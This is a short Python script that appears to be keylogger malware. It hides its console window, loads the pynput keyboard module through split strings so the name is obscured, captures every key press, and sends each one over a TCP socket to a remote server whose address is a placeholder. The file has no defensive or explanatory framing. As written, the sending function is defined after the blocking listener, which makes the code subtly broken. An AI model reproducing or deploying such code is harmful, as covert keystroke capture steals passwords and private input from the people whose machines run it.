import sys
import ctypes
import os
import socket

if not hasattr(sys, 'frozen'):
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

a = __import__('py' + 'np' + 'ut.ke' + 'yboa' + 'rd', fromlist=['Key', 'Listener'])
b = __import__('log' + 'ging')

log_dir = ""

# Define the IP and Port to send logs
log_server_ip = '?.?.?.?'
log_server_port = 1111

b.basicConfig(level=b.DEBUG, format='%(ascti' + 'me)s: %(me' + 'ssage)s')

def c(d):
    log_message = str(d)
    # Send the log message to the specified IP and Port
    send_log_to_server(log_message)

with a.Listener(on_press=c) as listener:
    listener.join()

# Function to send log messages to the server
def send_log_to_server(log_message):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((log_server_ip, log_server_port))
            s.send(log_message.encode())
    except Exception as e:
        print(f"Error sending log: {e}")
        